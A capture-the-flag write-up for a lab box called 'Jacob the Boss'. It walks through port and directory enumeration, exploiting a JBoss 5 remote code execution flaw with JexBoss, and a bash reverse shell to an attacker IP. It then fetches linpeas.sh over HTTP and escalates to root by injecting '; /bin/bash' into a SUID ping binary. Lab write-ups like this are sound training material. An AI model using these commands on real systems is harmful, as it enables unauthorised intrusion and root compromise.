# Jacob the Boss - Medium

* Add ```jacobtheboss.box``` to ```/etc/hosts``` and start scan - ```nmap -T4 -p- -A -Pn -v jacobtheboss.box```:

  * 22/tcp - ssh - OpenSSH 7.4 (protocol 2.0)
  * 80/tcp - http - Apache httpd 2.4.6 ((CentOS) PHP/7.3.20)
  * 111/tcp - rpcbind - 2-4 (RPC #100000)
  * 1090/tcp - java-rmi - Java RMI Registry
  * 1098/tcp - rmiregistry - Java RMI
  * 1099/tcp - java-rmi - Java RMI
  * 3306/tcp - mysql - MariaDB (unauthorized)
  * 3873/tcp - java-rmi - Java RMI
  * 4444/tcp - rmiregistry - Java RMI
  * 4446/tcp - java-rmi - Java RMI
  * 4457/tcp - tandem-print - Sharp printer tandem printing
  * 4712/tcp - msdtc - Microsoft Distributed Transaction Coordinator (error)
  * 4713/tcp - pulseaudio
  * 8009/tcp - ajp13 - Apache Jserv (Protocol v1.3)
  * 8080/tcp - http - Apache Tomcat/Coyote JSP engine 1.1
  * 8083/tcp - http - JBoss service httpd
  * 40348/tcp - rmiregistry - Java RMI

* On port 80, we have a blog page hosted by Dotclear; there is only one post with a comment from 'jacob', but it does not include anything interesting. We can do basic enumeration:

  ```sh
  gobuster dir -u http://jacobtheboss.box -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg -t 25
  # directory scanning

  ffuf -c -u "http://jacobtheboss.box" -H "Host: FUZZ.jacobtheboss.box" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25
  # subdomain enumeration

  ffuf -c -u "http://jacobtheboss.box" -H "Host: FUZZ.jacobtheboss.box" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 5214 -s
  # filtering false positives
  # this does not give anything

  gobuster vhost -u http://jacobtheboss.box -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
  # vhost enumeration
  # nothing found
  ```

* Web scanning gives us a lot of hits; interesting ones include:

  * /themes
  * /public
  * /admin
  * /README.md
  * /CHANGELOG

* We have a admin login page at /admin; and /CHANGELOG shows that the blog is running on Dotclear 2.16.9 (this is confirmed from source code of /admin login page as well)

* We can try default creds like 'admin:admin' or 'root:root', but it does not give us anything; we can continue to enumerate other services first

* Enumerating RPC on port 111:

  ```sh
  rpcinfo jacobtheboss.box

  rpcclient -U "" -N jacobtheboss.box
  # NT_STATUS_CONNECTION_REFUSED
  ```

* Continuing our web enumeration, on port 8080, we seem to have JBoss application manager running. We can start with web scanning:

  ```sh
  gobuster dir -u http://jacobtheboss.box:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg -t 25
  ```

* Directory scanning gives us the following pages on port 8080:

  * /images
  * /css
  * /status
  * /manager

* Other than these directories, from the source code, we can see options for JMX console at /jmx-console and Web console at /web-console

* We can further enumerate JBoss using ```msfconsole```:

  ```sh
  msfconsole

  search jboss
  # we have a scanner module

  use auxiliary/scanner/http/jboss_vulnscan

  options

  set RHOSTS jacobtheboss.box

  set RPORT 80

  run
  ```

* With the help of Metasploit, we are able to identify that on port 8080, the server is running Apache-Coyote/1.1, powered by Servlet 2.5; JBoss-5.0, JBossWeb-2.1

* JBoss 5 seems to be vulnerable to RCE; we have [an article exploiting JBoss through a malicious WAR file](https://medium.com/@madrobot/exploiting-jboss-like-a-boss-223a8b108206), and we also have a tool for exploiting JBoss - [JexBoss](https://github.com/joaomatosf/jexboss)

* We can try JexBoss to exploit the RCE vulnerability:

  ```sh
  # setup the tool first
  git clone https://github.com/joaomatosf/jexboss.git

  cd jexboss

  pip install -r requires.txt

  python jexboss.py -h

  python jexboss.py -host http://jacobtheboss.box:8080
  # this works and we get a shell

  # we have command execution now

  # we can get a better shell
  # setup listener in attacker machine
  nc -nvlp 4444

  # in jexboss shell
  sh -i >& /dev/tcp/10.14.60.78/4444 0>&1

  # we get reverse shell

  # stabilise the shell
  which python

  python -c 'import pty;pty.spawn("/bin/bash")'
  export TERM=xterm
  # Ctrl+Z
  stty raw -echo; fg
  # press Enter twice

  pwd

  ls -la /home
  # we have only 'jacob' user

  ls -la /home/jacob

  cat /home/jacob/user.txt
  # user flag

  # for basic enumeration, we can use linpeas.sh

  # in attacker machine, setup server
  python3 -m http.server 8000

  # in reverse shell
  cd /tmp

  wget http://10.14.60.78:8000/linpeas.sh

  chmod +x linpeas.sh

  ./linpeas.sh
  ```

* ```linpeas.sh``` shows an unknown SUID binary - ```/usr/bin/pingsys```. We need to check it further:

  ```sh
  ls -la /usr/bin/pingsys

  /usr/bin/pingsys
  # on running this, we get errors
  # syntax error near unexpected token `('
  # `ping -c 4 (null)''
  ```

* It seems the binary is expecting an argument, that is, an IP to ping to:

  ```sh
  /usr/bin/pingsys 127.0.0.1
  # this works
  # and we are seeing the output of 'ping' command itself
  ```

* The command seems to be running 'ping' under the hood, but throws an error when we do not give any arguments. As the error is associated with a missing quote, we can attempt command injection for this SUID binary:

  ```sh
  /usr/bin/pingsys 127.0.0.1`ls`
  # backticks do not work
  # as the 'ls' command is executed as it is

  /usr/bin/pingsys 127.0.0.1'id'
  # simply using quotes also does not work

  /usr/bin/pingsys 127.0.0.1'; id'
  # quote with semicolon works
  # and we get 'root' as output of 'id' after successful ping output
  ```

* Command injection works for this SUID binary with quote and semicolon - we can spawn a root shell using this method:

  ```sh
  /usr/bin/pingsys 127.0.0.1'; /bin/bash'
  # we get root shell after ping output

  cat /root/root.txt
  # root flag
  ```
